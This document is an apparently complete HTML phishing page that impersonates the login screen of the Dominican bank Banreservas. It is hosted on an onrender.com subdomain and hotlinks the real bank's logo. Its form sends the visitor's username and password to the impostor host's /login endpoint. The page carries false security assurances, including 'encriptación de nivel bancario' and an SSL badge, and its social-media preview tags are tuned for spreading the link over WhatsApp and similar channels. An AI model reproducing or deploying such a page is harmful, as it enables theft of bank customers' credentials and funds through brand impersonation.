<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Acceso Seguro - Banreservas</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="https://www.banreservas.com/favicon.ico">
    <link rel="apple-touch-icon" href="https://www.banreservas.com/favicon.ico">
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://banreservas-uyw8.onrender.com">
    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas">
    <meta property="og:description" content="Ingrese sus credenciales de forma segura para acceder a su cuenta bancaria. Protección garantizada con encriptación de nivel bancario.">
    <meta property="og:image" content="https://www.banreservas.com/images/logo-banreservas.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:site_name" content="Banreservas">
    <meta property="og:locale" content="es_DO">
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:url" content="https://banreservas-uyw8.onrender.com">
    <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas">
    <meta name="twitter:description" content="Ingrese sus credenciales de forma segura para acceder a su cuenta bancaria. Protección garantizada con encriptación de nivel bancario.">
    <meta name="twitter:image" content="https://www.banreservas.com/images/logo-banreservas.png">
    
    <!-- WhatsApp specific -->
    <meta property="og:image:secure_url" content="https://www.banreservas.com/images/logo-banreservas.png">
    
    <!-- General meta -->
    <meta name="description" content="Acceso seguro a su cuenta bancaria Banreservas. Ingrese sus credenciales de forma protegida.">
    <meta name="keywords" content="Banreservas, banco, acceso seguro, login bancario">
    <meta name="author" content="Banreservas">
    <meta name="theme-color" content="#004B8D">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        
        .logo {
            width: 120px;
            height: auto;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #004B8D;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #004B8D;
            box-shadow: 0 0 0 4px rgba(0,75,141,0.1);
        }
        
        .btn-login {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #004B8D 0%, #0066CC 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0,75,141,0.3);
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 25px;
            padding: 12px;
            background: #f0f7ff;
            border-radius: 10px;
            color: #004B8D;
            font-size: 13px;
            font-weight: 500;
        }
        
        .footer {
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        
        .timestamp {
            color: #004B8D;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.banreservas.com/images/logo-banreservas.png" alt="Banreservas" class="logo">
        <h1>🔐 Acceso Seguro</h1>
        <p class="subtitle">Ingrese sus credenciales para continuar</p>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="usuario">Usuario</label>
                <input type="text" id="usuario" name="usuario" placeholder="Ingrese su usuario" required>
            </div>
            
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" placeholder="Ingrese su contraseña" required>
            </div>
            
            <button type="submit" class="btn-login">Iniciar Sesión</button>
        </form>
        
        <div class="security-badge">
            <span>🔒</span>
            <span>Conexión segura encriptada SSL</span>
        </div>
        
        <div class="footer">
            <p>Banreservas © 2026</p>
            <p class="timestamp" id="fecha"></p>
        </div>
    </div>
    
    <script>
        // Fecha formateada: Jul 22, 2026 7:04 PM
        const ahora = new Date();
        const opciones = { 
            month: 'short', 
            day: 'numeric', 
            year: 'numeric',
            hour: 'numeric',
            minute: '2-digit',
            hour12: true
        };
        document.getElementById('fecha').textContent = ahora.toLocaleDateString('en-US', opciones);
    </script>
</body>
</html>
